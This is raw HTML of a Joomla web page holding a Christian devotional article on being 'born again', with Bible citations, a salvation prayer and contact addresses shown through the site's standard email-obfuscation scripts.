+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">Most of people do not believe in the Word of GOD. They are unable to trust in the Scriptures.<span style="mso-spacerun: yes;">  </span>Because of that they can’t take part of the blessing from Jesus as He thought: ’’Let the children come to me and do not prevent them, for the Kingdom of GOD belongs to such as these’’ (<strong>Matthew 10:14</strong>; <strong>Luke 18:16</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">Jesus said: ‘’ <em>I assure you that unless you change and become like children, you will never enter the Kingdom of heaven</em> ’’ (<strong>Matthew 18:3</strong>). Here, Jesus wants us to believe only in what GOD has promised. Those who do not accept this planning of reconciliation from GOD will be lost for ever. They could never live the supernatural life from the reconciliation.’’ <em>Remember that as long as heaven and earth last, not the least point nor the smallest detail of the Law will the end of all things</em> ’’ (<strong>Matthew 5:18</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri; color: #000000; font-size: small;"> </span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri; color: #000000; font-size: small;"> </span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">III.Being born again produces a nature without sin. 1John 3:9</span></span></span></strong></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">Most of people sometimes do not understand in clear that passage. You can understand it by your own experience. The only means to understand it is to be born again because its meaning is from the new creation and not form the old one, which is not from GOD. The old nature is from the fallen human and the new one is from the GOD our Father and it is holy</span><span style="mso-ansi-language: EN-US;" lang="EN-US"><span style="font-size: small;">.</span></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">a</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">What the text teaches about his new nature</span></em></span><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">?</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">1) The new nature can't sin because it’s from GOD‘s semen. (<strong>1John 3:9</strong>)</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">2) The new nature can sin because it has been put in us by a divine nature (<strong>2Peter1:4</strong>), and because GOD can’t sin, so the holy semen can’t sin.</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="color: #000000;"><span style="font-family: Calibri;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US">b</span></strong><span style="font-size: small;"><span style="mso-ansi-language: EN-US;" lang="EN-US">. </span><em style="mso-bidi-font-style: normal;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US">What the Bible teaches about the old nature?</span></em></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">1) The old nature sins anytime (<strong>Romans 6:12-13</strong>). As GOD’s child you must not obey to it.</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">2) No good thing comes from the old nature. (<strong>Roman 7:18, 19</strong>).The old nature can’t make you live in justice, but only by the new nature. (<strong>Galates 2:20</strong>). When you are born again, you have both the old nature and the new one. You are living by both of them. So, you really need to meditate anytime the Word of GOD.</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><strong style="mso-bidi-font-weight: normal;"><span style="line-height: 115%; font-size: 14pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">IV. The proof of the New Creation. 1John 5:1</span></span></span></strong></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">Every child of GOD has the three proof of a new nature. The first one is internal, the second is external and the third one is both internal and external.</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">1) Believe that Jesus is the Christ: whoever believes that Jesus is the Christ, is born again. (<strong>John 5:1</strong>). Your faith in both the personality and the divinity of Christ is evidence that you are a new creation.</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">2) Do what is just: Whoever does what is just is born from GOD (<strong>1John 2:29; 3:9</strong>).</span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">If you are born again you may need to do what is just and to be recognize what is not just in your life. You must confess your sins to GOD and turn away from it. That’s the external proof the new creation.</span></span></span></p>
+</p>
+<p class="MsoNormal" style="text-align: justify;"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="color: #000000;"><span style="font-family: Calibri;">3) To Love: whoever loves is born from GOD (<strong>1John 4:7-11</strong>). The Christian loves his brothers in Christ. The Christian like to talk about the goodness of GOD to the others in order to help come to Christ. So, he is doing what Jesus recommended to every one of us. We can’t do the same one by the old nature but only by the new nature. We must let GOD loves through us (<strong>Romans 5:5</strong>).This is both an internal and external proof.<br /><br />Do you want to become a New Creation? You must first accepte Jesus Christ as your personal Savior and Lord. So, pray sincerely like that: <strong>''I thank you so much Jesus for your Word. From now, I recognize that I am a sinner.But rigth now I understand and I believe that You died for my sins. Because of that I accepte you as my personal Savior and Lord.Come and lead things in my life. Please forgive me for all my sins and cleanse me by your blood. I refuse to be with the devil for ever.But I welcome the Holy Spirit in my life from now. Thanks a lot to let me be a New Creation and to become a citizen of the Kingdom of GOD.Thanks again''</strong>.<br /><br />Right now, as a citizen of the Kingdom of GOD, you  must read the Bible all the time you can and you must look for a Church where  to go.And where you may be baptized. The baptism is the second step after accepting Christ as your Savior.You can look for that Church in your current area or hometown. Note that , that Church must recognize both Jesus and the Holy Spirit as the Lord.So, You are now a member of the Family of GOD. Congratulations!<br /><br />Please note that Christian life is a step by step life. You can fail, but do never worry. Just put only your trust in the Lord your GOD and you will stand firm(2Chronicals20:20). As you can't go to university right on your day of birth, but you need first to go to primary school, then to High school and to college or to university. Christian life is like that process. You can't be mature right the day you are born again. So, you must go step by step by letting Jesus leads things for you.You can't do anything without Him. The Holy Spirit is able to teach you how to practice the Word of GOD. He is the power of GOD giver.He is also the best Teacher of the Word of GOD.In the coming days, you will have the opportunity to learn more about Him. An article will be written about that.Before, please take these things into account.Have a nice meditation time!<br /><em> <br />Please feel free to contact me at your convenient address of the following: 
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ var prefix = 'm&#97;&#105;lt&#111;:';
+ var suffix = '';
+ var attribs = '';
+ var path = 'hr' + 'ef' + '=';
+ var addy21125 = '&#97;d.l&#97;r&#101;f&#111;rm&#97;t&#105;&#111;n' + '&#64;';
+ addy21125 = addy21125 + 'gm&#97;&#105;l' + '&#46;' + 'c&#111;m';
+ document.write( '<a ' + path + '\'' + prefix + addy21125 + suffix + '\'' + attribs + '>' );
+ document.write( addy21125 );
+ document.write( '<\/a>' );
+ //-->
+ </script><script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '<span style=\'display: none;\'>' );
+ //-->
+ </script>This e-mail address is being protected from spambots. You need JavaScript enabled to view it
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '</' );
+ document.write( 'span>' );
+ //-->
+ </script> or </em><a href="mailto:
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ var prefix = 'm&#97;&#105;lt&#111;:';
+ var suffix = '';
+ var attribs = '';
+ var path = 'hr' + 'ef' + '=';
+ var addy32669 = 'l&#97;r&#101;f&#111;rm&#97;t&#105;&#111;n' + '&#64;';
+ addy32669 = addy32669 + 'y&#97;h&#111;&#111;' + '&#46;' + 'fr';
+ document.write( '<a ' + path + '\'' + prefix + addy32669 + suffix + '\'' + attribs + '>' );
+ document.write( addy32669 );
+ document.write( '<\/a>' );
+ //-->
+ </script><script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '<span style=\'display: none;\'>' );
+ //-->
+ </script>This e-mail address is being protected from spambots. You need JavaScript enabled to view it
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '</' );
+ document.write( 'span>' );
+ //-->
+ </script>"><em>
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ var prefix = 'm&#97;&#105;lt&#111;:';
+ var suffix = '';
+ var attribs = '';
+ var path = 'hr' + 'ef' + '=';
+ var addy2655 = 'l&#97;r&#101;f&#111;rm&#97;t&#105;&#111;n' + '&#64;';
+ addy2655 = addy2655 + 'y&#97;h&#111;&#111;' + '&#46;' + 'fr';
+ document.write( '<a ' + path + '\'' + prefix + addy2655 + suffix + '\'' + attribs + '>' );
+ document.write( addy2655 );
+ document.write( '<\/a>' );
+ //-->
+ </script><script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '<span style=\'display: none;\'>' );
+ //-->
+ </script>This e-mail address is being protected from spambots. You need JavaScript enabled to view it
+ <script language='JavaScript' type='text/javascript'>
+ <!--
+ document.write( '</' );
+ document.write( 'span>' );
+ //-->
+ </script></em></a><em> with any further suggestion or question. Stay blessed in Christ Jesus!<br /></em></span></span></span></p>
+<p class="MsoNormal" style="text-align: justify; margin: 0cm 0cm 10pt;">
+<p class="MsoNormal"><span style="line-height: 115%; font-size: 12pt; mso-ansi-language: EN-US;" lang="EN-US"><span style="font-family: Calibri; color: #000000;"><br /><em><strong>''YOU HAVE RECEIVED WITHOUT PAYING, SO GIVE WITHOUT BEING PAID'' <br /></strong>Matthew 10:8</em></span></span></p>
+</p></td>
+</tr>
+
+<tr>
+	<td colspan="2"  class="modifydate">
+		Last Updated on Friday, 24 February 2012 20:49	</td>
+</tr>
+
+
+</table>
+<span class="article_separator">&nbsp;</span>
+		</div>
+		</td>
+</tr>
+
+
+</table>
+
+												<div class="moduletable">
+					<div class="bannergroup">
+
+
+</div>		</div>
+			<div class="moduletable">
+					<div>Copyright &#169; 2018 lareformation. All Rights Reserved.</div>
+<div><a href="http://www.joomla.org">Joomla!</a> is Free Software released under the <a href="http://www.gnu.org/licenses/gpl-2.0.html">GNU/GPL License.</a></div>		</div>
+	
+									</td>
+																			<td class="greyline">&nbsp;</td>
+										<td width="170">
+													<div class="moduletable">
+					<h3>Who's Online</h3>
+					 We have&nbsp;1 guest&nbsp;online		</div>
+			<div class="moduletable_text">
+					<h3>Advertisement</h3>
+					<div class="bannergroup_text">
+
+	<div class="bannerheader">Featured Links:</div>
+
+	<div class="bannerfooter_text">
+		 <a href="http://www.joomla.org">Ads by Joomla!</a>	</div>
+</div>		</div>
+	
+										</td>
+																	</tr>
+							</table>
+
+						</div>
+						<div class="clr"></div>
+					</div>
+					<div class="clr"></div>
+				</div>
+
+				<div id="whitebox_b">
+					<div id="whitebox_bl">
+						<div id="whitebox_br"></div>
+					</div>
+				</div>
+			</div>
+
+			<div id="footerspacer"></div>
+		</div>
+
+		<div id="footer">
+			<div id="footer_l">
+				<div id="footer_r">
+					<p id="syndicate">
+						<a href="/lareformation.info/index.php?format=feed&amp;type=rss">
+	<img src="/lareformation.info/images/M_images/livemarks.png" alt="feed-image"  /> <span>Feed Entries</span></a>
+					</p>
+					<p id="power_by">
+	 				 	Powered by <a href="http://www.joomla.org">Joomla!</a>.
+						valid <a href="http://validator.w3.org/check/referer">XHTML</a> and <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
+					</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+</body>
+</html>
